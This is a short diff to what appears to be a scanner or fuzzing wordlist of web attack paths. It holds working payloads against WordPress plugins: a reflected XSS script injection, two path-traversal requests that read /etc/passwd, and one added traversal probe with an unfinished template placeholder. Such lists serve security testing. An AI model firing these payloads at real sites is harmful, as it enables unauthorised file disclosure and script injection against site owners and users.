@@ -180,3 +180,4 @@
 /wp-content/plugins/socialfit/popup.php?service=googleplus&msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd
 /?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+/volume/stream/Rmx1aWc=/{{base64(
